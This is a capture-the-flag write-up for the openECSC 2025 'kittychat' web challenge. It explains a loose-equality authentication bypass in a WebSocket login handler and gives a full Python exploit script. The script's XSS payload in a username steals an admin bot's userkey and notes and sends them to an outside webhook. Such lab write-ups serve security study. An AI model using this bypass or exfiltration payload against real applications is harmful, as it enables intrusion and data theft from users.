# openECSC 2025

## Challenge: kittychat

## Tags: web

## Difficulty: Medium

## Table of Contents

- [Solution Overview](#solution-overview)
- [Tools Used](#tools-used)
- [Solution](#solution)
- [Solution Script](#solution-script)
- [Flag](#flag)

### Solution Overview

KittyChat is a web chat application vulnerable to XSS through username injection. The key insight is that the WebSocket LOGIN handler has a critical authentication bypass: when `data.key` is omitted (undefined) and the account doesn't exist, the check `accounts[username]?.userkey == data.key` evaluates to `undefined == undefined`, which is TRUE. This allows me to "authenticate" without credentials and bypass the username regex validation that normally blocks HTML characters. I exploit this by: (1) sending a LOGIN message with an HTML-laden username and no key, (2) triggering the admin bot who visits the chat, (3) our malicious username gets rendered via `createContextualFragment()` causing XSS to fire, (4) the XSS steals the admin's notes containing the flag. The flag hints at the intended mitigation: Content Security Policy.

### Tools Used

- Python 3 with `websockets` library
- Browser DevTools for debugging
- [webhook.site](https://webhook.site) for flag exfiltration

### Solution

#### Initial Analysis

When I first examined the application, I found a chat system with WebSocket communication. The client-side code in `chat.js` had an obvious XSS vulnerability in the `updateUsers()` function:

```javascript
function updateUsers(usersList) {
  const documentFragment = document.createRange().createContextualFragment(
    ["Currently online:", ...usersList].map(e=>`<div>${e}</div>`).join('')
  );
  // ... renders directly without escaping
}
```

The `createContextualFragment()` method parses HTML, so if any username contains HTML tags with JavaScript, it will execute. Perfect! Now I just need to inject an XSS payload into a username.

#### The Roadblock: Username Validation

Looking at the server-side WebSocket handler (`ws.js`), I saw that anonymous users' usernames are validated:

```javascript
function setUsername(ws, username, anonymous) {
  if (anonymous && 
      (getUsers().includes(username) || 
       !/^kitten_[0-9]+$/.test(username))) {
    ws.username = `invalid_${Math.random().toString(16).substring(2)}`;
    return false;
  }
  ws.username = username;
  return true;
}
```

The regex `/^kitten_[0-9]+$/` only allows "kitten_" followed by digits. HTML injection? Rejected. I confirmed this with a quick test:

```python
# Sending START with HTML username
ws.send(json.dumps({"type": "START", "username": "kitten_1<img>"}))
# Result: server changed it to "invalid_7e2369fbfaefd"
```

Dead end. Or was it?

#### The Breakthrough: Authentication Bypass

After hitting this wall, I carefully re-examined ALL the code paths. The key was noticing that `setUsername()` is called with `anonymous=false` from the LOGIN handler, which would SKIP the regex check! But how do I trigger LOGIN without valid credentials?

Looking at the LOGIN handler more closely:

```javascript
case "LOGIN":
  if (accounts[data.username]?.userkey == data.key) {
    ws.verified = true;
    setUsername(ws, data.username, false);  // anonymous=false!
  }
```

Wait. What happens if I send a LOGIN message for a username that DOESN'T exist, and I DON'T include the `key` field at all?

- `accounts['nonexistent']` → undefined
- `accounts['nonexistent']?.userkey` → undefined
- `data.key` (when not provided) → undefined
- **`undefined == undefined`** → **TRUE** ✨

JavaScript's loose equality strikes again! The check passes, `ws.verified` gets set to true, and `setUsername()` is called with our arbitrary username WITHOUT validation!

#### Exploitation

With this bypass, the attack becomes straightforward:

1. **Craft XSS payload**: Create a username containing an `<img>` tag with `onerror` that fetches the admin's notes and exfiltrates to our webhook
2. **Send LOGIN without key**: This bypasses authentication and sets our HTML username
3. **Send START**: Broadcasts the user list with our malicious username to all clients
4. **Trigger admin bot**: Send `!admin` message
5. **Wait for XSS**: When the bot joins and renders the user list, our JavaScript executes in the bot's context
6. **Profit**: The XSS steals the bot's userkey and notes, sending the flag to our webhook

The critical sequence in code:

```python
# Step 1: LOGIN bypass with HTML username (no "key" field)
malicious_username = f"kitten_<img src=x onerror=\"fetch('/user').then(...)\">"
await ws.send(json.dumps({
    "type": "LOGIN",
    "username": malicious_username
    # Omitting "key" makes it undefined
}))

# Step 2: START to broadcast users (HTML username included)
await ws.send(json.dumps({"type": "START", "username": "anything"}))

# Step 3: Trigger the bot
await ws.send(json.dumps({"type": "MESSAGE", "text": "!admin"}))
```

When the admin bot visits the chat:
- Bot's browser receives the USERS message
- `updateUsers()` calls `createContextualFragment()` with our HTML username
- Our `<img onerror>` fires
- XSS fetches `/user` to get bot's userkey
- Fetches `/notes` with the userkey to get the flag
- Exfiltrates to our webhook

Flag received: `flag{n1c3_j0b_but_n0w_d0_1t_w1th_csp}`

### Solution Script

```python
#!/usr/bin/env python3
import asyncio
import websockets
import json
import sys

TARGET = "https://524bfd36-75cb-4eea-82ee-234c4a4e7e77.openec.sc:1337"

async def exploit(webhook):
    ws_url = TARGET.replace("https://", "wss://")
    
    # XSS payload that steals bot's notes
    payload = f'<img src=x onerror="fetch(\'/user\').then(r=>r.json()).then(u=>fetch(\'/notes\',{{method:\'POST\',headers:{{\'Content-Type\':\'application/json\'}},body:JSON.stringify({{key:u.userkey}})}}).then(r=>r.json()).then(d=>fetch(\'{webhook}?flag=\'+encodeURIComponent(d.notes))))">'
    
    malicious_username = f"kitten_{payload}"
    
    async with websockets.connect(ws_url, ping_interval=None) as ws:
        # Exploit: LOGIN without key → undefined == undefined → bypass!
        await ws.send(json.dumps({
            "type": "LOGIN",
            "username": malicious_username
        }))
        await asyncio.sleep(0.5)
        
        # Broadcast user list with malicious username
        await ws.send(json.dumps({"type": "START", "username": "x"}))
        await asyncio.sleep(1)
        
        # Trigger admin bot
        await ws.send(json.dumps({"type": "MESSAGE", "text": "!admin"}))
        
        print(f"[+] Exploit sent! Check webhook: {webhook}")
        await asyncio.sleep(15)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <webhook_url>")
        sys.exit(1)
    asyncio.run(exploit(sys.argv[1]))
```

### Flag

**`flag{n1c3_j0b_but_n0w_d0_1t_w1th_csp}`**
